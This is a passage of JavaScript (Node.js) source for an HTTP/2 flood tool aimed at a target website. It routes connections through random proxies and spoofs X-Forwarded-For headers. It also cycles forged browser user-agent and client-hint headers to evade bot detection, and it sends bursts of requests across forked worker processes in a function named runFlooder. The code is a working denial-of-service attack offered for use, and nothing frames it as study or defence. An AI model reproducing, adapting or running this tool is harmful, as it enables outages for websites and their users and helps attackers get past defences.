		  sec1 = '" Not;A Brand";v="53", "Google Chrome";v="113", "Chromium";v="113"';
		  sec2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36";
		  sec3 = "Linux";
		  sec4 = "113.0.0.0";
                  sec5 = "10.0";
                  sec6 = '" Not;A Brand";v="53.0.0.0", "Google Chrome";v="115.0.0.0", "Chromium";v="115.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36") {
		  sec1 = '" Not;A Brand";v="49", "Google Chrome";v="112", "Chromium";v="112"';
		  sec2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36";
		  sec3 = "Linux";
		  sec4 = "112.0.0.0";
                  sec5 = "10.0";
                  sec6 = '" Not;A Brand";v="49.0.0.0", "Google Chrome";v="112.0.0.0", "Chromium";v="112.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36") {
		  sec1 = '" Not;A Brand";v="69", "Google Chrome";v="111", "Chromium";v="111"';
		  sec2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36";
		  sec3 = "Linux";
		  sec4 = "111.0.0.0";
                  sec5 = "10.0";
                  sec6 = '" Not;A Brand";v="69.0.0.0", "Google Chrome";v="111.0.0.0", "Chromium";v="111.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36") {
		  sec1 = '" Not;A Brand";v="65", "Google Chrome";v="110", "Chromium";v="110"';
		  sec2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36";
		  sec3 = "Linux";
		  sec4 = "110.0.0.0";
                  sec5 = "10.0";
                  sec6 = '" Not;A Brand";v="65.0.0.0", "Google Chrome";v="110.0.0.0", "Chromium";v="110.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36") {
		  sec1 = '" Not;A Brand";v="43", "Google Chrome";v="109", "Chromium";v="109"';
		  sec2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";
		  sec3 = "Linux";
		  sec4 = "109.0.0.0";
                  sec5 = "10.0";
                  sec6 = '" Not;A Brand";v="43.0.0.0", "Google Chrome";v="109.0.0.0", "Chromium";v="109.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36") {
		  sec1 = '" Not;A Brand";v="34", "Google Chrome";v="108", "Chromium";v="108"';
		  sec2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36";
		  sec3 = "Linux";
		  sec4 = "108.0.0.0";
                  sec5 = "10.0";
                  sec6 = '" Not;A Brand";v="34.0.0.0", "Google Chrome";v="108.0.0.0", "Chromium";v="108.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36") {
		  sec1 = '" Not;A Brand";v="33", "Google Chrome";v="115", "Chromium";v="115"';
		  sec2 = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36";
		  sec3 = "Windows";
		  sec4 = "115.0.0.0";
                  sec5 = "6.3";
                  sec6 = '" Not;A Brand";v="33.0.0.0", "Google Chrome";v="115.0.0.0", "Chromium";v="115.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          }  else if (randomUserAgent === "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36") {
		  sec1 = '"Chromium";v="116", " Not A;Brand";v="52", "Google Chrome";v="116"';
		  sec2 = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36";
		  sec3 = "Windows";
		  sec4 = "116.0.0.0";
                  sec5 = "6.3";
                  sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="52.0.0.0", "Google Chrome";v="116.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36") {
		  sec1 = '"Chromium";v="116", " Not A;Brand";v="89", "Google Chrome";v="116"';
		  sec2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36";
		  sec3 = "Mac OS X";
		  sec4 = "116.0.0.0";
                  sec5 = "10_15_0";
                  sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="89.0.0.0", "Google Chrome";v="116.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36") {
		  sec1 = '"Chromium";v="115", " Not A;Brand";v="79", "Google Chrome";v="115"';
		  sec2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36";
		  sec3 = "Mac OS X";
		  sec4 = "115.0.0.0";
                  sec5 = "10_15_0";
                  sec6 = '"Chromium";v="115.0.0.0", " Not A;Brand";v="79.0.0.0", "Google Chrome";v="115.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36") {
		  sec1 = '"Chromium";v="114", " Not A;Brand";v="19", "Google Chrome";v="114"';
		  sec2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36";
		  sec3 = "Mac OS X";
		  sec4 = "114.0.0.0";
                  sec5 = "10_15_0";
                  sec6 = '"Chromium";v="114.0.0.0", " Not A;Brand";v="19.0.0.0", "Google Chrome";v="114.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36") {
		  sec1 = '"Chromium";v="113", " Not A;Brand";v="29", "Google Chrome";v="113"';
		  sec2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36";
		  sec3 = "Mac OS X";
		  sec4 = "113.0.0.0";
                  sec5 = "10_15_0";
                  sec6 = '"Chromium";v="113.0.0.0", " Not A;Brand";v="29.0.0.0", "Google Chrome";v="113.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36") {
		  sec1 = '"Chromium";v="116", " Not A;Brand";v="59", "Google Chrome";v="116"';
		  sec2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36";
		  sec3 = "Mac OS X";
		  sec4 = "116.0.0.0";
                  sec5 = "13_5_1";
                  sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="59.0.0.0", "Google Chrome";v="116.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36") {
		  sec1 = '"Chromium";v="115", " Not A;Brand";v="91", "Google Chrome";v="115"';
		  sec2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36";
		  sec3 = "Mac OS X";
		  sec4 = "115.0.0.0";
                  sec5 = "13_5_1";
                  sec6 = '"Chromium";v="115.0.0.0", " Not A;Brand";v="91.0.0.0", "Google Chrome";v="115.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36") {
		  sec1 = '"Chromium";v="114", " Not A;Brand";v="92", "Google Chrome";v="114"';
		  sec2 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36";
		  sec3 = "Mac OS X";
		  sec4 = "114.0.0.0";
                  sec5 = "13_5_1";
                  sec6 = '"Chromium";v="114.0.0.0", " Not A;Brand";v="92.0.0.0", "Google Chrome";v="114.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0") {
		  sec1 = '"Chromium";v="116", " Not A;Brand";v="97", "Google Chrome";v="116"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0";
		  sec3 = "Windows";
		  sec4 = "116.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="97.0.0.0", "Google Chrome";v="116.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0") {
		  sec1 = '"Chromium";v="111", " Not A;Brand";v="82", "Google Chrome";v="111"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0";
		  sec3 = "Windows";
		  sec4 = "111.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="111.0.0.0", " Not A;Brand";v="82.0.0.0", "Google Chrome";v="111.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0") {
		  sec1 = '"Chromium";v="110", " Not A;Brand";v="49", "Google Chrome";v="110"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0";
		  sec3 = "Windows";
		  sec4 = "110.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="110.0.0.0", " Not A;Brand";v="49.0.0.0", "Google Chrome";v="110.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0") {
		  sec1 = '"Chromium";v="109", " Not A;Brand";v="38", "Google Chrome";v="109"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0";
		  sec3 = "Windows";
		  sec4 = "109.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="109.0.0.0", " Not A;Brand";v="38.0.0.0", "Google Chrome";v="109.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0") {
		  sec1 = '"Chromium";v="108", " Not A;Brand";v="28", "Google Chrome";v="108"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0";
		  sec3 = "Windows";
		  sec4 = "108.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="108.0.0.0", " Not A;Brand";v="28.0.0.0", "Google Chrome";v="108.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0") {
		  sec1 = '"Chromium";v="107", " Not A;Brand";v="96", "Google Chrome";v="107"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0";
		  sec3 = "Windows";
		  sec4 = "107.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="107.0.0.0", " Not A;Brand";v="96.0.0.0", "Google Chrome";v="107.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0") {
		  sec1 = '"Chromium";v="106", " Not A;Brand";v="8", "Google Chrome";v="106"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0";
		  sec3 = "Windows";
		  sec4 = "106.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="106.0.0.0", " Not A;Brand";v="8.0.0.0", "Google Chrome";v="106.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0") {
		  sec1 = '"Chromium";v="105", " Not A;Brand";v="16", "Google Chrome";v="105"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0";
		  sec3 = "Windows";
		  sec4 = "105.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="110.0.0.0", " Not A;Brand";v="16.0.0.0", "Google Chrome";v="110.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0") {
		  sec1 = '"Chromium";v="105", " Not A;Brand";v="24", "Google Chrome";v="105"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0";
		  sec3 = "Windows";
		  sec4 = "105.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="105.0.0.0", " Not A;Brand";v="24.0.0.0", "Google Chrome";v="105.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          } else {
		  sec1 = '"Chromium";v="115", " Not A;Brand";v="26", "Google Chrome";v="115"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0";
		  sec3 = "Windows";
		  sec4 = "115.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="115.0.0.0", " Not A;Brand";v="26.0.0.0", "Google Chrome";v="115.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
          }
  
  }

  setInterval(() => {
	  updateSecValues();
  }, 1);
  
  updateSecValues();

 if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {setInterval(runFlooder) }
 
 class NetSocket {
     constructor(){}
 
  HTTP(options, callback) {
     const parsedAddr = options.address.split(":");
     const addrHost = parsedAddr[0];
     const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
     const buffer = new Buffer.from(payload);
 
     const connection = net.connect({
         host: options.host,
         port: options.port
     });
 
     connection.setTimeout(options.timeout * 600000);
     connection.setKeepAlive(true, 100000);
 
     connection.on("connect", () => {
         connection.write(buffer);
     });
 
     connection.on("data", chunk => {
         const response = chunk.toString("utf-8");
         const isAlive = response.includes("HTTP/1.1 200");
         if (isAlive === false) {
             connection.destroy();
             return callback(undefined, "error: invalid response from proxy server");
         }
         return callback(connection, undefined);
     });
 
     connection.on("timeout", () => {
         connection.destroy();
         return callback(undefined, "error: timeout exceeded");
     });
 
     connection.on("error", error => {
         connection.destroy();
         return callback(undefined, "error: " + error);
     });
 }
 }

 const Socker = new NetSocket();
 headers[":method"] = "GET";
 headers[":authority"] = parsedTarget.host;
 headers[":scheme"] = "https";
 headers["x-forwarded-proto"] = "https";
 headers[":path"] = parsedTarget.path; //+ "?" + randstr(4) + "=" + randstr(6);
 headers["accept-encoding"] = encoding;
 headers["X-Forwarded-For"] = spoofed;
 headers["sec-ch-ua"] = sec1;
 headers["sec-gpc"] = "1";
 headers["sec-ch-ua-mobile"] = "?0";
 headers["sec-ch-ua-full-version"] = sec4;
 headers["sec-ch-ua-full-version-list"] = sec6;
 headers["sec-ch-ua-arch"] = "x86";
 headers["sec-ch-ua-bitness"] = "64";
 headers["DNT"] = "1";
 headers["sec-ch-ua-platform"] = sec3;
 headers["sec-ch-ua-platform-version"] = sec5;
 headers["upgrade-insecure-requests"] = "1";
 headers["accept"] =  accept;
 headers["user-agent"] = sec2;
 headers["accept-language"] = lang;
 headers["sec-fetch-mode"] = sec8;
 headers["sec-fetch-dest"] = sec7;
 headers["sec-fetch-user"] = "?1";
 headers["pragma"] = "no-cache";
 headers["sec-fetch-site"] = sec9;
 headers["te"] = "trailers";
 headers["x-requested-with"] = "XMLHttpRequest";
 
 function runFlooder() {
     const proxyAddr = randomElement(proxies);
     const parsedProxy = proxyAddr.split(":");

     const proxyOptions = {
         host: parsedProxy[0],
         port: ~~parsedProxy[1],
         address: parsedTarget.host + ":443",
         timeout: 100,
     };

     Socker.HTTP(proxyOptions, (connection, error) => {
         if (error) return
 
         connection.setKeepAlive(true, 600000);

         const tlsOptions = {
            host: parsedTarget.host,
            secure: true,
            ALPNProtocols: ['h2'],
            sigals: siga,
            socket: connection,
            ecdhCurve: "prime256v1:X25519",
            ciphers: cipper,
            host: parsedTarget.host,
            rejectUnauthorized: false,
            servername: parsedTarget.host,
            secureProtocol: "TLS_method",
        };

         const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions); 

         tlsConn.setKeepAlive(true, 60000);

         const client = http2.connect(parsedTarget.href, {
             protocol: "https:",
             settings: {
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
          },
             maxSessionMemory: 3333,
             maxDeflateDynamicTableSize: 4294967295,
             createConnection: () => tlsConn,
             socket: connection,
         });
 
         client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 65536,
            enablePush: false
          });
 
         client.on("connect", () => {
            const IntervalAttack = setInterval(() => {
                const dynHeaders = {
                  ...headers,
                  ...rateHeaders2[Math.floor(Math.random()*rateHeaders.length)],
                  ...rateHeaders[Math.floor(Math.random()*rateHeaders.length)]
                };
                for (let i = 0; i < args.Rate; i++) {
                    const request = client.request(dynHeaders)
                    
                    client.on("response", response => {
                        request.close();
                        request.destroy();
                        return
                    });
    
                    request.end();
                }
            }, 1000); 
         });
 
         client.on("close", () => {
             client.destroy();
             connection.destroy();
             return
         });
     }),function (error, response, body) {
		};
 }
 
 const KillScript = () => process.exit(1);
 
 setTimeout(KillScript, args.time * 1000);
